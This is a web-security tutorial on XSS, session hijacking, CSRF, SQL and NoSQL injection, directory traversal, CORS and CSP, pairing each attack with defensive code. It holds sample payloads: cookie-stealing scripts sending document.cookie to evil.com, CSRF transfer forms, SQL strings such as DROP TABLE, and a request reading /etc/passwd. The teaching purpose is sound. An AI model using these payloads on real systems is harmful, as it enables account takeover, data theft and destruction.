## Introduction

Many websites still have security vulnerabilities despite modern development practices. Understanding these risks is crucial for building secure applications.

---

## XSS (Cross-Site Scripting)

### What is XSS?

XSS is a vulnerability where an attacker injects malicious JavaScript code into a website, which then executes in other users' browsers. This happens when user input is displayed on a page **without proper sanitization or escaping**.

### How It Works

1. Attacker finds an input field with poor validation (comments, search, profile)
2. Attacker injects malicious script instead of normal text
3. Script gets saved or reflected back to users
4. When victims visit the page, the malicious code executes in **their** browser
5. Attacker can steal cookies, session tokens, or perform actions on behalf of the victim

### Types of XSS

#### 1. **Stored XSS** (Persistent)

- Malicious script is **saved in the database** (e.g., in comments)
- Executes for **every user** who views the infected page
- **Most dangerous type**

#### 2. **Reflected XSS**

- Script is **not saved**, only "reflected" from server back to user
- Typically through URL parameters or search queries
- Only affects users who click the malicious link
- Attackers spread these links via email, social media, etc.

---

## Example Attack

### Vulnerable Code (Node.js/Express):

```javascript
app.get('/search', (req, res) => {
  const query = req.query.q;
  
  res.send(`
    <html>
      <body>
        <h2>Search results for: ${query}</h2>
      </body>
    </html>
  `);
});
```

### Attack Payload:

```
/search?q=<script>document.location='http://evil.com?cookie='+document.cookie;</script>
```

**Result:** The attacker steals the victim's session cookie and can impersonate them!

---

## XSS Protection Methods

### 1. **Escaping/Encoding** (Most Important!)

Always escape user input before displaying it in HTML:

```javascript
const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q); // 🛡️ Safe!
  
  res.send(`
    <html>
      <body>
        <h2>Search results for: ${query}</h2>
      </body>
    </html>
  `);
});
```

**Key transformations:**

- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#x27;`

**Different contexts need different escaping:**

- HTML content: `escapeHtml()`
- URL parameters: `encodeURIComponent()`

### 2. **Content Security Policy (CSP)**

HTTP header that tells the browser which scripts to trust:

```
Content-Security-Policy: script-src 'self'
```

Even if XSS payload gets injected, the browser **won't execute** it!

### 3. **HttpOnly Cookies**

Prevents JavaScript from accessing cookies:

```javascript
res.cookie('session', token, { httpOnly: true });
```

Now `document.cookie` won't return the session token, mitigating cookie theft.

### 4. **Use Modern Frameworks**

- React, Vue, Angular automatically escape content by default
- **BUT**: Features like `dangerouslySetInnerHTML` (React) or `v-html` (Vue) bypass protection
- Use these only when absolutely necessary and with sanitized content

---

## Session Hijacking

### What is a Session?

HTTP is **stateless** - each request is independent. To maintain state (know who you are), servers use **session IDs** stored in cookies:

```
Set-Cookie: sessionId=abc123xyz
```

Your browser automatically sends this cookie with every request:

```
GET /profile
Cookie: sessionId=abc123xyz
```

Server sees the session ID and knows it's you!

### Session Hijacking

**Session hijacking** = stealing someone's session ID to impersonate them.

If an attacker gets your `sessionId`, they can **pretend to be you** without knowing your password!

### Methods of Session Hijacking

#### 1. **Session Fixation**

Attack flow:

1. Attacker logs into `bank.com` → gets `sessionId=EVIL123`
2. Attacker tricks victim into using THIS session ID (via malicious link or XSS):
    
    ```
    https://bank.com/login?sessionId=EVIL123
    ```
    
3. Victim logs in with `sessionId=EVIL123`
4. Server now associates `EVIL123` with victim's account
5. Attacker uses `EVIL123` → full access to victim's account!

**Protection:** Server must generate a **NEW** session ID after successful login:

```javascript
// After login
session.regenerate((err) => {
  // Old session ID is now invalid
  // Attacker's EVIL123 is useless
});
```

#### 2. **Session Sidejacking** (Packet Sniffing)

Attacker intercepts network traffic (e.g., public Wi-Fi) and captures the session ID.

**Dangerous scenario:**

```
1. https://bank.com/login  ← Password encrypted ✅
2. http://bank.com/profile  ← Session ID NOT encrypted ❌
```

Attacker sniffs step 2, steals `sessionId`, no password needed!

**Protection:** Use **HTTPS everywhere**, not just for login!

```javascript
// Force HTTPS for all routes
app.use((req, res, next) => {
  if (!req.secure) {
    return res.redirect('https://' + req.headers.host + req.url);
  }
  next();
});
```

#### 3. **XSS-based Session Hijacking**

XSS can steal session cookies (as we saw earlier):

```javascript
<script>
  fetch('http://evil.com?cookie=' + document.cookie);
</script>
```

**Protection:** Use `HttpOnly` cookies (mentioned in XSS section)

---

## CSRF (Cross-Site Request Forgery)

### What is CSRF?

CSRF tricks a logged-in user into performing unwanted actions on a trusted site without their knowledge.

### How CSRF Works

1. Alice logs into `bank.com` → has active session
2. Alice visits malicious site `evil.com`
3. `evil.com` contains hidden request to `bank.com`:

```html
<img src="http://bank.com/withdraw?account=Alice&amount=100000&for=Mallory">
```

4. Browser **automatically** sends the request with Alice's cookies
5. Bank thinks Alice made the request → money transferred! 💸

### Why Does This Work?

Browser automatically includes cookies with **every** request to that domain, even if the request originates from another site!

### CSRF with POST Requests

GET requests are easier to exploit, but POST is also vulnerable:

```html
<!-- On evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="Mallory">
  <input type="hidden" name="amount" value="100000">
  <button type="submit">Click here for funny cat video!</button>
</form>

<script>
  // Can even auto-submit
  document.forms[0].submit();
</script>
```

### Important: Never Use GET for State Changes!

```javascript
// ❌ BAD - GET request changes state
app.get('/delete-account', (req, res) => {
  // Delete user account
});

// ✅ GOOD - Use POST/DELETE
app.post('/delete-account', (req, res) => {
  // Delete user account
});
```

**Why?** GET requests are too easy to trigger (links, images, etc.)

### Example: Logout with POST

Even logout should use POST to prevent CSRF attacks:

```html
<a href="/logout" id="logout">Logout</a>
<form method="POST" action="/logout" id="logoutForm"></form>

<script>
  document.getElementById("logout").addEventListener("click", (e) => {
    e.preventDefault();
    document.getElementById("logoutForm").submit();
  });
</script>
```

---

## CSRF Protection

### CSRF Tokens (Primary Defense)

Add a unique, unpredictable token to each form:

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="kljsdf897ds98f7o9h8fd">
  <input type="text" name="amount">
  <button type="submit">Transfer</button>
</form>
```

**How it works:**

1. Server generates unique token when rendering the form
2. Server stores token in session
3. Client submits form with token
4. Server validates: token matches session? ✅ Process / ❌ Reject

**Why this works:**

- Attacker on `evil.com` **cannot read** the token from `bank.com` (Same-Origin Policy)
- Without valid token, request is rejected

### Implementation Example (Express):

```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Render form with token
app.get('/transfer', csrfProtection, (req, res) => {
  res.render('transfer', { csrfToken: req.csrfToken() });
});

// Validate token on submission
app.post('/transfer', csrfProtection, (req, res) => {
  // If we reach here, token is valid
  // Process transfer
});
```

### Other CSRF Protections

1. **SameSite Cookie Attribute:**
    
    ```javascript
    res.cookie('session', token, { 
      httpOnly: true,
      sameSite: 'strict' // Don't send cookie on cross-site requests
    });
    ```
    
2. **Check Referer/Origin Headers:**
    
    ```javascript
    app.use((req, res, next) => {
      const origin = req.get('origin');
      if (origin && origin !== 'https://mysite.com') {
        return res.status(403).send('Forbidden');
      }
      next();
    });
    ```
    
3. **Require Re-authentication for Sensitive Actions:**
    
    - Ask for password before money transfer
    - Two-factor authentication for critical operations

---

## SQL Injection

### What is SQL Injection?

SQL injection exploits **unsanitized user input** that gets directly inserted into SQL queries. The attacker can alter the query logic to access or manipulate unauthorized data.

### Classic Example

**Vulnerable code:**

```javascript
const statement = "SELECT * FROM users WHERE name = '" + userName + "';";
```

**Attack payload:**

```
userName = "' or '1'='1"
```

**Resulting query:**

```sql
SELECT * FROM users WHERE name = '' or '1'='1';
```

Since `'1'='1'` is always true, this returns **ALL users** instead of just one!

### More Dangerous Attacks

Attackers can:

- **Read sensitive data:** `'; SELECT * FROM credit_cards; --`
- **Modify data:** `'; UPDATE users SET admin=1 WHERE name='attacker'; --`
- **Delete data:** `'; DROP TABLE users; --`

### Protection Against SQL Injection

#### 1. **Use Parameterized Queries** (Most Important!)

```javascript
// ❌ VULNERABLE - String concatenation
const query = "SELECT * FROM users WHERE name = '" + userName + "'";

// ✅ SAFE - Parameterized query
const query = "SELECT * FROM users WHERE name = ?";
db.query(query, [userName], (err, results) => {
  // userName is treated as DATA, not code
});
```

**Why this works:** The parameter (`?`) is never interpreted as SQL code, only as a string value.

#### 2. **Use ORM Libraries**

```javascript
// Using Sequelize (ORM)
const user = await User.findOne({
  where: { name: userName }
});
// ORM handles sanitization automatically
```

#### 3. **Never Show Database Errors to Users**

```javascript
// ❌ BAD - Exposes database structure
app.get('/user/:id', (req, res) => {
  db.query('SELECT * FROM users WHERE id = ?', [req.params.id], (err, results) => {
    if (err) {
      res.send(err.message); // Shows SQL error!
    }
  });
});

// ✅ GOOD - Generic error message
app.get('/user/:id', (req, res) => {
  db.query('SELECT * FROM users WHERE id = ?', [req.params.id], (err, results) => {
    if (err) {
      console.error(err); // Log for debugging
      res.status(500).send('Something went wrong');
    }
  });
});
```

### NoSQL Injection

**NoSQL databases are also vulnerable!**

```javascript
// MongoDB - Vulnerable
db.collection('users').find({ 
  username: req.body.username,
  password: req.body.password 
});

// Attack payload in JSON:
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
// This returns ANY user where username and password exist!
```

**Protection:** Validate input types and use proper MongoDB query methods:

```javascript
// ✅ Safe - Validate input is a string
if (typeof req.body.username !== 'string') {
  return res.status(400).send('Invalid input');
}
```

---

## Directory Traversal

### What is Directory Traversal?

Exploiting insufficient validation of file paths to access files outside the intended directory using `../` (parent directory).

### Example Attack

**Vulnerable PHP code:**

```php
<?php
$template = 'red.php';

if(isset($_COOKIE['TEMPLATE'])) {
    $template = $_COOKIE['TEMPLATE'];
}

include("/home/users/phpguru/templates/" . $template);
?>
```

**Attack request:**

```http
GET /vulnerable.php HTTP/1.0
Cookie: TEMPLATE=../../../../../../../../../etc/passwd
```

**Result:** Server returns `/etc/passwd` instead of a template file!

**Resolved path:**

```
/home/users/phpguru/templates/../../../../../../../../../etc/passwd
→ /etc/passwd
```

### Protection Against Directory Traversal

#### 1. **Validate Input - Block `../`**

```javascript
// ❌ VULNERABLE
app.get('/file', (req, res) => {
  const filename = req.query.name;
  res.sendFile('/templates/' + filename);
});

// ✅ SAFE - Validate no traversal characters
app.get('/file', (req, res) => {
  const filename = req.query.name;
  
  if (filename.includes('..') || filename.includes('/')) {
    return res.status(400).send('Invalid filename');
  }
  
  res.sendFile('/templates/' + filename);
});
```

#### 2. **Use Whitelist Approach**

```javascript
const allowedFiles = ['red.php', 'blue.php', 'green.php'];

if (!allowedFiles.includes(filename)) {
  return res.status(400).send('File not allowed');
}
```

#### 3. **Server Configuration**

Run web server with minimal file system permissions:

- **Never run as root!**
- Web server user should only access necessary directories
- Use chroot jails or containers to isolate file system access

---

## Same-Origin Policy (SOP)

### What is Same-Origin Policy?

Browser security mechanism that **restricts how documents and scripts from one origin can interact with resources from another origin**.

### What Defines "Same Origin"?

Two URLs have the **same origin** if they match:

1. **Protocol** (http vs https)
2. **Host** (domain name)
3. **Port** (80, 443, 3000, etc.)

**Examples:**

|URL|Same Origin as `http://example.com/page.html`?|
|---|---|
|`http://example.com/other.html`|✅ Yes (same protocol, host, port)|
|`https://example.com/page.html`|❌ No (different protocol)|
|`http://example.com:8080/page.html`|❌ No (different port)|
|`http://other.com/page.html`|❌ No (different host)|

### What SOP Allows/Blocks

**Generally allowed (cross-origin):**

- Embedding images: `<img src="http://other.com/image.jpg">`
- Loading scripts: `<script src="http://other.com/script.js">`
- Embedding CSS: `<link href="http://other.com/style.css">`
- Form submissions

**Generally blocked (cross-origin):**

- Reading responses from AJAX/Fetch requests
- Accessing cookies from other origins
- Reading `localStorage` from other origins

---

## CORS (Cross-Origin Resource Sharing)

### What is CORS?

CORS uses **HTTP headers** to tell browsers which cross-origin requests to allow.

### How CORS Works

1. Browser makes a request to a different origin
2. Browser includes `Origin` header:
    
    ```
    Origin: http://example.com
    ```
    
3. Server responds with CORS headers:
    
    ```
    Access-Control-Allow-Origin: http://example.comAccess-Control-Allow-Methods: GET, POSTAccess-Control-Allow-Headers: Content-Type
    ```
    
4. If headers permit it, browser allows the request

### Example: Enabling CORS in Express

```javascript
// Allow specific origin
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'http://example.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

// Or allow ALL origins (use cautiously!)
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  next();
});

// Using cors library (recommended)
const cors = require('cors');
app.use(cors({
  origin: 'http://example.com',
  credentials: true // Allow cookies
}));
```

### CORS Preflight Requests

For certain requests (e.g., PUT, DELETE, custom headers), browsers send a **preflight OPTIONS request** first:

```http
OPTIONS /api/users HTTP/1.1
Origin: http://example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization
```

Server must respond with appropriate CORS headers for the actual request to proceed.

---

## Content Security Policy (CSP) - Revisited

CSP is an HTTP header that specifies **which resources are allowed to load**.

### CSP Directives

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; img-src *
```

**Breakdown:**

- `default-src 'self'` - By default, only load resources from same origin
- `script-src 'self' https://trusted.com` - Scripts only from same origin or trusted.com
- `img-src *` - Images can be loaded from anywhere

### Common Directives

|Directive|Purpose|
|---|---|
|`default-src`|Default policy for all resource types|
|`script-src`|Where scripts can be loaded from|
|`style-src`|Where stylesheets can be loaded from|
|`img-src`|Where images can be loaded from|
|`connect-src`|Where AJAX/WebSocket connections allowed|
|`frame-src`|Where iframes can be loaded from|

### CSP Example (Express)

```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://cdn.example.com"
  );
  next();
});
```

**Effect:** Even if an attacker injects XSS, the browser won't execute inline scripts or scripts from unauthorized domains!

---

## Final Summary

### Attack Comparison

|Attack|What Happens|Key Protection|
|---|---|---|
|**XSS**|Attacker injects malicious code into site|Escape user input, CSP, HttpOnly cookies|
|**Session Hijacking**|Attacker steals session ID to impersonate user|HTTPS everywhere, HttpOnly cookies, regenerate sessions|
|**CSRF**|Attacker tricks user into unwanted action on another site|CSRF tokens, SameSite cookies|
|**SQL Injection**|Attacker manipulates database queries|Parameterized queries, ORMs|
|**Directory Traversal**|Attacker accesses unauthorized files|Input validation, whitelist files|

### Root Causes of Vulnerabilities

1. **Mixing code and data** (SQL injection, XSS)
2. **Trusting user input** (all injection attacks)
3. **Insufficient validation** (directory traversal, CSRF)
4. **Poor session management** (session hijacking)

### Defense Principles

✅ **Never trust user input** - validate, sanitize, escape ✅ **Use parameterized queries** - prevent SQL injection ✅ **Escape output** - prevent XSS ✅ **Use HTTPS everywhere** - prevent session hijacking ✅ **Implement CSRF tokens** - prevent CSRF ✅ **Configure CORS properly** - control cross-origin access ✅ **Set CSP headers** - additional XSS protection ✅ **Use HttpOnly & Secure cookies** - protect session data ✅ **Keep dependencies updated** - patch known vulnerabilities ✅ **Defense in depth** - multiple layers of security

### Security Checklist

- [ ] All user input is validated and sanitized
- [ ] SQL queries use parameterized statements
- [ ] Output is properly escaped (HTML, URL, JS contexts)
- [ ] HTTPS is enforced for all pages
- [ ] Cookies have `HttpOnly`, `Secure`, and `SameSite` flags
- [ ] CSRF protection is implemented for state-changing operations
- [ ] CSP headers are configured
- [ ] CORS is configured to allow only trusted origins
- [ ] File access is validated against directory traversal
- [ ] Error messages don't leak sensitive information
- [ ] Sessions are regenerated after login
- [ ] GET requests don't modify data

**Remember:** Security is an ongoing process, not a one-time fix!